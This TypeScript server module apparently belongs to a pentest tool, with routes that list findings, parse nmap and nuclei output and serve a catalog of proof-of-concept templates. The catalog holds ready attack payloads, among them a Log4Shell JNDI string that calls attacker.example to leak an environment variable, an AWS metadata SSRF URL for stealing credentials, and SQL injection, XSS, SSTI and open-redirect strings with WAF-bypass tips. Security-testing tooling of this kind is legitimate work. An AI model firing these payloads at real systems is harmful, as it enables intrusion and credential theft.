import { Hono } from "hono"
import { describeRoute, resolver, validator } from "hono-openapi"
import z from "zod"
import path from "path"
import fs from "fs/promises"
import { Project } from "../../project/project"
import { lazy } from "../../util/lazy"

const Node: z.ZodType<{
  name: string
  path: string
  type: "file" | "directory"
  size?: number
  mtime?: number
  children?: any[]
}> = z.lazy(() =>
  z.object({
    name: z.string(),
    path: z.string(),
    type: z.enum(["file", "directory"]),
    size: z.number().optional(),
    mtime: z.number().optional(),
    children: z.array(Node).optional(),
  }),
)

const Engagement = z.object({
  project: z.string(),
  worktree: z.string(),
  root: z.string(),
  tree: z.array(Node),
})

// PoC template catalog (built-in). Extend by dropping JSON files into
// pentest-output/<engagement>/poc-templates/.
const POC_TEMPLATES = [
  {
    id: "log4shell",
    title: "Log4Shell (CVE-2021-44228)",
    severity: "critical",
    cwe: "CWE-502",
    payload: "${jndi:ldap://attacker.example/${env:USER}}",
    notes: "Inject into any log-reflected header (User-Agent, X-Forwarded-For, Referer).",
  },
  {
    id: "ssrf-aws-imds",
    title: "SSRF — AWS IMDSv1 metadata",
    severity: "high",
    cwe: "CWE-918",
    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    notes: "Try IMDSv2 (PUT /latest/api/token) if v1 is blocked.",
  },
  {
    id: "sqli-union",
    title: "SQL Injection — UNION-based",
    severity: "high",
    cwe: "CWE-89",
    payload: "' UNION SELECT NULL,version(),current_user-- -",
    notes: "Adjust column count using ORDER BY N.",
  },
  {
    id: "xss-img-onerror",
    title: "Reflected XSS — img onerror",
    severity: "medium",
    cwe: "CWE-79",
    payload: '"><img src=x onerror=alert(document.domain)>',
    notes: "Try with HTML-encoded variants if WAF strips quotes.",
  },
  {
    id: "ssti-jinja",
    title: "SSTI — Jinja2",
    severity: "high",
    cwe: "CWE-1336",
    payload: "{{7*7}} → 49 then {{config.items()}}",
    notes: "Confirm with arithmetic before escalation.",
  },
  {
    id: "open-redirect",
    title: "Open Redirect",
    severity: "low",
    cwe: "CWE-601",
    payload: "?next=//attacker.example/",
    notes: "Bypass via @, \\\\, or unicode dot.",
  },
]

// Severity classifier from nuclei templateInfo.severity or nmap script output.
function severityRank(s: string): number {
  const m: Record<string, number> = { info: 0, low: 1, medium: 2, high: 3, critical: 4 }
  return m[(s || "").toLowerCase()] ?? 0
}

// Parse nuclei JSON-lines export and return normalized findings.
function parseNuclei(text: string) {
  const lines = text.split(/\r?\n/).filter(Boolean)
  const out = []
  for (const line of lines) {
    let j: any
    try {
      j = JSON.parse(line)
    } catch {
      continue
    }
    out.push({
      source: "nuclei",
      title: j.info?.name ?? j["template-id"] ?? "unknown",
      severity: (j.info?.severity ?? "info").toLowerCase(),
      affected: j["matched-at"] ?? j.host ?? "",
      description: j.info?.description ?? "",
      references: j.info?.reference ?? [],
      evidence: j.matcher_status ? `matcher=${j["matcher-name"] ?? ""}` : "",
      raw: j,
    })
  }
  return out
}

// Parse nmap -oX XML and return per-port findings.
function parseNmap(xml: string) {
  const out: any[] = []
  const hostRe = /<host[\s\S]*?<\/host>/g
  const addrRe = /<address[^>]*addr="([^"]+)"/
  const portRe =
    /<port\s+protocol="([^"]+)"\s+portid="(\d+)"[\s\S]*?<state state="([^"]+)"[^>]*\/>(?:[\s\S]*?<service[^>]*name="([^"]+)"(?:[^>]*product="([^"]+)")?(?:[^>]*version="([^"]+)")?[^>]*\/>)?/g
  for (const h of xml.match(hostRe) ?? []) {
    const addr = addrRe.exec(h)?.[1] ?? ""
    portRe.lastIndex = 0
    let m: RegExpExecArray | null
    while ((m = portRe.exec(h))) {
      if (m[3] !== "open") continue
      const svc = m[4] ?? "?"
      const product = [m[5], m[6]].filter(Boolean).join(" ")
      out.push({
        source: "nmap",
        title: `Open ${svc} on ${addr}:${m[2]}/${m[1]}${product ? ` (${product})` : ""}`,
        severity: "info",
        affected: `${addr}:${m[2]}/${m[1]}`,
        description: `nmap detected ${svc} ${product}`,
        references: [],
        evidence: "",
        raw: { addr, port: m[2], proto: m[1], service: svc, product },
      })
    }
  }
  return out
}

async function walk(dir: string, depth = 0): Promise<any[]> {
  if (depth > 6) return []
  const entries = await fs.readdir(dir, { withFileTypes: true }).catch(() => [])
  const out = []
  for (const e of entries) {
    if (e.name.startsWith(".")) continue
    const full = path.join(dir, e.name)
    if (e.isDirectory()) {
      out.push({
        name: e.name,
        path: full,
        type: "directory" as const,
        children: await walk(full, depth + 1),
      })
      continue
    }
    const stat = await fs.stat(full).catch(() => null)
    out.push({
      name: e.name,
      path: full,
      type: "file" as const,
      size: stat?.size,
      mtime: stat?.mtimeMs,
    })
  }
  return out.sort((a, b) => {
    if (a.type !== b.type) return a.type === "directory" ? -1 : 1
    return a.name.localeCompare(b.name)
  })
}

async function isAllowed(target: string) {
  const projects = await Project.list()
  return projects.some((p) => {
    const root = path.resolve(path.join(p.worktree, "pentest-output"))
    return target === root || target.startsWith(root + path.sep)
  })
}

export const SecurityRoutes = lazy(() =>
  new Hono()
    .get(
      "/findings",
      describeRoute({
        summary: "List pentest findings across projects",
        description: "Walks pentest-output/ directories under every known project and returns a tree.",
        operationId: "security.findings",
        responses: {
          200: {
            description: "Engagements grouped by project",
            content: {
              "application/json": {
                schema: resolver(z.array(Engagement)),
              },
            },
          },
        },
      }),
      async (c) => {
        const projects = await Project.list()
        const out = []
        for (const p of projects) {
          const root = path.join(p.worktree, "pentest-output")
          const exists = await fs
            .stat(root)
            .then((s) => s.isDirectory())
            .catch(() => false)
          if (!exists) continue
          out.push({
            project: p.name ?? path.basename(p.worktree),
            worktree: p.worktree,
            root,
            tree: await walk(root),
          })
        }
        return c.json(out)
      },
    )
    .get(
      "/findings/file",
      describeRoute({
        summary: "Read a finding file",
        description: "Read the contents of a file inside a project's pentest-output/ directory.",
        operationId: "security.readFinding",
        responses: {
          200: {
            description: "File content",
            content: {
              "application/json": {
                schema: resolver(z.object({ path: z.string(), content: z.string(), size: z.number() })),
              },
            },
          },
        },
      }),
      validator("query", z.object({ path: z.string() })),
      async (c) => {
        const target = path.resolve(c.req.valid("query").path)
        if (!(await isAllowed(target))) return c.json({ error: "path outside pentest-output" }, 403)
        const stat = await fs.stat(target).catch(() => null)
        if (!stat || !stat.isFile()) return c.json({ error: "not a file" }, 404)
        if (stat.size > 2 * 1024 * 1024) return c.json({ error: "file too large" }, 413)
        const content = await fs.readFile(target, "utf8").catch(() => "")
        return c.json({ path: target, content, size: stat.size })
      },
    )
    .get(
      "/dashboard",
      describeRoute({
        summary: "Aggregated engagement stats",
        operationId: "security.dashboard",
        responses: {
          200: {
            description: "Stats per engagement",
            content: { "application/json": { schema: resolver(z.array(z.any())) } },
          },
        },
      }),
      async (c) => {
        const projects = await Project.list()
        const out: any[] = []
        for (const p of projects) {
          const root = path.join(p.worktree, "pentest-output")
          const exists = await fs
            .stat(root)
            .then((s) => s.isDirectory())
            .catch(() => false)
          if (!exists) continue
          const engagements = await fs.readdir(root, { withFileTypes: true }).catch(() => [])
          for (const e of engagements) {
            if (!e.isDirectory()) continue
            const ePath = path.join(root, e.name)
            const findingsPath = path.join(ePath, "findings.json")
            const data = await fs.readFile(findingsPath, "utf8").catch(() => "")
            let findings: any[] = []
            if (data)
              try {
                findings = JSON.parse(data)
              } catch {}
            const counts = { info: 0, low: 0, medium: 0, high: 0, critical: 0 }
            for (const f of findings) {
              const s = (f.severity ?? "info").toLowerCase()
              if (s in counts) (counts as any)[s]++
            }
            const stat = await fs.stat(ePath).catch(() => null)
            out.push({
              project: p.name ?? path.basename(p.worktree),
              engagement: e.name,
              root: ePath,
              total: findings.length,
              counts,
              max: findings.reduce((m, f) => Math.max(m, severityRank(f.severity)), 0),
              modified: stat?.mtimeMs ?? 0,
            })
          }
        }
        out.sort((a, b) => b.modified - a.modified)
        return c.json(out)
      },
    )
    .post(
      "/import",
      describeRoute({
        summary: "Import nmap or nuclei output into findings.json",
        operationId: "security.import",
        responses: {
          200: {
            description: "Import result",
            content: { "application/json": { schema: resolver(z.object({ added: z.number(), path: z.string() })) } },
          },
        },
      }),
      validator(
        "json",
        z.object({
          engagement: z.string(),
          format: z.enum(["nuclei", "nmap"]),
          source: z.string(), // either an absolute path inside pentest-output, or raw text
        }),
      ),
      async (c) => {
        const { engagement, format, source } = c.req.valid("json")
        const projects = await Project.list()
        // Find first project that owns the engagement dir.
        let target: string | null = null
        for (const p of projects) {
          const root = path.join(p.worktree, "pentest-output", engagement)
          if (
            await fs
              .stat(root)
              .then((s) => s.isDirectory())
              .catch(() => false)
          ) {
            target = root
            break
          }
        }
        if (!target) {
          // Fallback: create under first project.
          const p = projects[0]
          if (!p) return c.json({ error: "no project" }, 400)
          target = path.join(p.worktree, "pentest-output", engagement)
          await fs.mkdir(target, { recursive: true })
        }
        // Load source: if it looks like a path inside the engagement, read it.
        let text = source
        const candidate = path.resolve(source)
        if (await isAllowed(candidate)) {
          text = await fs.readFile(candidate, "utf8").catch(() => source)
        }
        const parsed = format === "nuclei" ? parseNuclei(text) : parseNmap(text)
        const findingsPath = path.join(target, "findings.json")
        const existingRaw = await fs.readFile(findingsPath, "utf8").catch(() => "[]")
        let existing: any[] = []
        try {
          existing = JSON.parse(existingRaw)
        } catch {}
        const merged = [...existing, ...parsed]
        await fs.writeFile(findingsPath, JSON.stringify(merged, null, 2))
        return c.json({ added: parsed.length, path: findingsPath, total: merged.length })
      },
    )
    .get(
      "/poc-templates",
      describeRoute({
        summary: "List built-in PoC templates",
        operationId: "security.pocTemplates",
        responses: {
          200: {
            description: "Template catalog",
            content: { "application/json": { schema: resolver(z.array(z.any())) } },
          },
        },
      }),
      async (c) => c.json(POC_TEMPLATES),
    ),
)
